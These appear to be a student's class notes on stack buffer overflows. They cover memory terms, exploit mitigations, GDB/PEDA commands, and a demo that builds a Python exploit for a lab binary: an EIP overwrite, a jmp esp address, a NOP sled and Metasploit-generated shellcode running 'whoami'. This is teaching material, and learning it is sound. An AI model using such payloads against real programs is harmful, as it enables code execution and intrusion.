**Buffer Overflow Common Terms**
**Heap**
Memory that can be allocated and deallocated
**Stack**
A contiguous section of memory used for passing arguments
**Registers**
Storage elements as close as possible to the central processing unit (CPU)
**Instruction Pointer (IP)**
a.k.a Program Counter (PC), contains the address of next instruction to be executed
**Stack Pointer (SP)**
Contains the address of the next available space on the stack (points to the top)
**Base Pointer (BP)**
The base of the stack  (points to the bottom)
**Function**
Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
**Shellcode**
The code that is executed once an exploit successfully takes advantage of a vulnerability
''' ''' ''' ''' ''' ''' ''' ''' ''' ''' '''
**Buffer Overflow Defenses**
    **Non executable (NX) stack**
      a stack that is marked as non-executable, meaning that it cannot be utilized to store or execute code
    **Address Space Layout Randomization (ASLR)**
      randomize the memory addresses where a program's code, data, and heap are loaded
    **Data Execution Prevention (DEP)**
      marks certain areas of your computer's memory as non-executable, preventing code from running from those areas.
    **Stack Canaries**
      are a secret value placed on the stack which changes every time the program is started
    **Position Independent Executable (PIE)**
      executable binaries made entirely from position-independent code

**Utilizing tools such as:**
    IDA, GHIDRA
    GDB, MONA, IMMUNITY
    BASH, PYTHON

**GDB Uses**
Installation of Peda Plugin
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
**Common Commands**
disass <FUNCTION>   #   Disassemble portion of the program
info <...>  #   Supply info for specific stack areas
x/256c $<REGISTER>  #   Read characters from specific register
break <address>  #   Establish a break point

---------------------------------------------------------
Class Demo Notes
--
file func
strings func
gdb func
run (may have to chmod file)
disass main
disass getuserinput
disass gets / disass puts (splits)

puts - prestandard command prints to standard output
gets- prestandard command reads from standard input (user/file input) (deprecated)

pdisass getuserinput - shows if function is vulnerable
run <<< $(python test.py) - runs to see if input allows files

enter a bunch of A's to try to buffer overflow
get the number that will make it overflow

then right script

buffer = "A" * 62
eip = "BBBB"
print(buffer + eip)

env - gdb func (allows us to set environmental variables)
show-env
unset LINES
unset COLUMNS

crash the program

info proc map ( memory locations of all processes running)
find /b 0xf7de2000 , 0xf7ffe000 , 0xff, 0xe4
            top location, bottom location, jump esp command

copy first 3
put them in code
then flip order

buffer = "A" * 62
#eip = "BBBB"
eip = "\x59\x3b\xde\xf7"
#0xf7de3b59 "\xf7\xde\x3b\x59" "\x59\x3b\xde\xf7"
#0xf7f588ab "\xf7\xf5\x88\xab" "\xab\x88\xf5\xf7"
#0xf7f645fb "\xf7\xf6\x45\xfb" "\xfb\x45\xf6\xf7"
nop = '\x90' * 5
print(buffer + eip + nop)
-then run script

msfconsole
use payload/linux/x86/exec
set CMD whoami
show options
generate -b "\x00" -f python
copy the entire buf and put it in script




buffer = "A" * 62
#eip = "BBBB"
eip = "\x59\x3b\xde\xf7"
#0xf7de3b59 "\xf7\xde\x3b\x59" "\x59\x3b\xde\xf7"
#0xf7f588ab "\xf7\xf5\x88\xab" "\xab\x88\xf5\xf7"
#0xf7f645fb "\xf7\xf6\x45\xfb" "\xfb\x45\xf6\xf7"
nop = '\x90' * 5
buf = b""
buf += b"\xbf\x25\x37\x36\x07\xd9\xc3\xd9\x74\x24\xf4\x5b"
buf += b"\x31\xc9\xb1\x0b\x31\x7b\x14\x83\xc3\x04\x03\x7b"
buf += b"\x10\xc7\xc2\x5c\x0c\x5f\xb4\xf3\x74\x37\xeb\x90"
buf += b"\xf1\x20\x9b\x79\x71\xc6\x5c\xee\x5a\x74\x34\x80"
buf += b"\x2d\x9b\x94\xb4\x29\x5b\x19\x45\x41\x33\x76\x24"
buf += b"\xc0\xaa\x88\xf1\x49\xa5\x68\x30\xed"
print(buffer + eip + nop + buf)






























































